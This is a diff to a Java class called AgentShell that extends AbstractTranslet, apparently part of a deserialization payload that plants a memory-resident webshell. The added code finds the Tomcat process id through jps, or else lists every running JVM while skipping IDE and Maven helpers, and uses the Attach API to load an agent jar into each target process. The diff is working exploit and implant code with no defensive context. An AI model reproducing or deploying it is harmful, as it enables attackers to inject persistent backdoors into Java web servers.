@@ -10,6 +10,7 @@ import java.io.BufferedReader;
 import java.io.InputStream;
 import java.io.InputStreamReader;
 import java.lang.reflect.Method;
+import java.util.ArrayList;
 import java.util.List;
 import java.util.regex.Matcher;
 import java.util.regex.Pattern;
@@ -36,6 +37,26 @@ public class AgentShell extends AbstractTranslet {
             Method attachMethod = VirtualMachineCls.getDeclaredMethod("attach", new Class[]{String.class});
             Method loadAgentMethod = VirtualMachineCls.getDeclaredMethod("loadAgent", new Class[]{String.class});
 
+            String pid = AgentShell.getTomcatPid();
+            if(pid == null){
+                pid = AgentShell.getTomcatPid2();
+            }
+            if (pid != null){
+                System.out.println(pid);
+                vm = attachMethod.invoke(null, pid);
+                loadAgentMethod.invoke(vm,AgentShell.jarPath);
+            }else {
+                List<String> allId = AgentShell.getAllId();
+                for (String id : allId){
+                    System.out.println(pid);
+                    try {
+                        vm = attachMethod.invoke(null, id);
+                        loadAgentMethod.invoke(vm,AgentShell.jarPath);
+                    }catch (Exception e){
+                        e.printStackTrace();
+                    }
+                }
+            }
 
             vm = attachMethod.invoke(null, AgentShell.getTomcatPid());
             loadAgentMethod.invoke(vm,AgentShell.jarPath);
@@ -54,7 +75,29 @@ public class AgentShell extends AbstractTranslet {
             int flag2 = 0;
         }
     }
+    public static List<String> getAllId(){
+        List<String> l = new ArrayList<>();
+        try{
+            Method listMethod = VirtualMachineCls.getDeclaredMethod("list",null);
+            java.util.List list = (java.util.List)listMethod.invoke(null,null);
 
+            Method displayNameMethod = VirtualMachineDescriptorCls.getDeclaredMethod("displayName",null);
+            Method idMethod = VirtualMachineDescriptorCls.getDeclaredMethod("id",null);
+
+            for(int i = 0; i < list.size(); i++){
+                Object v = list.get(i);
+                String name = (String)displayNameMethod.invoke(v,null);
+                if(name.contains("org.jetbrains.jps.cmdline.Launcher") || name.contains("AgentShellMain") || name.contains("RemoteMavenServer") || name.equals("")){
+                    continue;
+                }
+                l.add((String) idMethod.invoke(v,null));
+            }
+        }catch (Exception e){
+            e.printStackTrace();
+        }
+
+        return l;
+    }
     public static String getTomcatPid(){
         try {
             Process ps = Runtime.getRuntime().exec("jps");
